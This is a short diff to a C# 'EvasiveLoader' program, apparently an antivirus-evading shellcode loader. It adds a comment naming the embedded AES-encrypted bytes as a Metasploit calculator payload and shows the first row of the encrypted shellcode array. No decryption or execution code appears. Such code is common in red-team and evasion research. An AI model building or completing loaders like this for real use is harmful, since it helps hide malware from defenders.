@@ -41,6 +41,7 @@ namespace EvasiveLoader
     {
         // ─────────────────────────────────────────────
         // EMBEDDED ENCRYPTED SHELLCODE + AES KEY / IV
+        // calcx64 Metasploit payload, AES-256-CBC encrypted, 288 bytes
         // ─────────────────────────────────────────────
         private static readonly byte[] EncryptedPayload = new byte[512] {
                 0xF2, 0x6E, 0x40, 0xFA, 0xF6, 0xB3, 0x16, 0x7A, 0x7B, 0x6C, 0xBA, 0x99, 0x40, 0xF5, 0x9D, 0x5E,
